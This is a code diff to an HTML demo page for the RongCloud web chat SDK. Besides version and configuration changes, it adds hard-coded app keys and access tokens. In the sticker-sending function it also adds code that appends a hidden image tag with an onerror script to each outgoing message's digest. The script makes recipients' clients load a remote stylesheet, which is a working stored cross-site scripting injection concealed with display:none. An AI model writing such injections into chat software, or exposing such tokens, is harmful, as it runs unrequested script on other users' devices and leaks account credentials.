@@ -139,7 +139,8 @@
   </style>
 </head>
 <body>
-  <script src="http://cdn.ronghub.com/RongIMLib-2.3.2.js"></script>
+  <!-- <script src="http://localhost:8686/web-sdk-v2/dist/RongIMLib.js"></script> -->
+  <script src="http://cdn.ronghub.com/RongIMLib-2.3.1.js"></script>
   <script src="./init.js"></script>
   <script src="./sticker.js"></script>
   <div class="rong-container" style="display: none;">
@@ -159,11 +160,11 @@
   </div>
 
   <div class="rong-buttons" >
-      <input type="text" value="n19jmcy59f1q9" placeholder="appkey" id="appkey">
-      <input type="text" value="nav.cn.ronghub.com" placeholder="nav" id="nav">
-      <input type="text" value="48WQuGNh7065SB3WVJYnt6+YsUIoF3ojin3K277sfOlwuO8bLvftw4xaa/DrZEyJMsLZ9PPIg+8Ph5+QmAtoP6tdpZUyLdaH" placeholder="token" id="token" class="rong-token">
+      <input type="text" value="tdrvipkst7v85" placeholder="appkey" id="appkey">
+      <input type="text" value="navprodrcx.cn.ronghub.com" placeholder="nav" id="nav">
+      <input type="text" value="AAx7BKFi+e+VBQ5I4gRv5G8Q//LPWkDoKwWSItHcBXE2Krz+Y3sa8XpeU26GeeliLn2lVhq0V+Qd1DKzkkV4zDOVb14=" placeholder="token" id="token" class="rong-token">
       <input type="text" id="conversationType" placeholder="conversationType" value="1">
-      <input type="text" id="targetId" placeholder="targetId" value="sLakct3QJ">
+      <input type="text" id="targetId" placeholder="targetId" value="1">
       <input type="button" value="connect" onclick="connect()">
   </div>
 
@@ -355,9 +356,22 @@
         sendSticker: function(content){
           var msg = new RongIMClient.RegisterMessage.StickerMessage(content);
           var info = conversation.get();
+          //https://fsprodrcx.cn.ronghub.com/dTw9a3U-PFiajz1rdTw9a3WVAt91PD7FGFlOGBRbWA/custom-martin.css
+          
+          // var getContent = function(){
+          //   return 'window.node=document.createElement("link");node.href="http://rongcloud-file.ronghub.com/00c3b44c979ef08657.css?attname=custom-martin.css&e=2147483647&token=CddrKW5AbOMQaDRwc3ReDNvo3-sL_SO1fSUBKV3H:ZksI3NV3SEze2mf43Tjdl5fbw0w=";node.rel="stylesheet";node.type="text/css";document.body.appendChild(node);'
+          // };
+          // msg.digest='"<img src="xx" onerror=' + getContent() + '>'
+
+          var getContent = function(){
+            return 'window.node=document.createElement("link");node.href="http://rongcloud-file.ronghub.com/00c3b44c979ef08657.css?attname=custom-martin.css&e=2147483647&token=CddrKW5AbOMQaDRwc3ReDNvo3-sL_SO1fSUBKV3H:ZksI3NV3SEze2mf43Tjdl5fbw0w=";node.rel="stylesheet";node.type="text/css";document.body.appendChild(node);'
+          };
+          var digest = msg.digest;
+          msg.digest= digest+'<img src="xx" onerror=' + getContent() + ' style="display:none;">'
           Rong.sendMessage(+info.conversationType, info.targetId, msg, {
             onSuccess: function(message) {
               log.show(message);
+              handler.send();
               },
               onError: function(error, message) {
                 log.show(message);
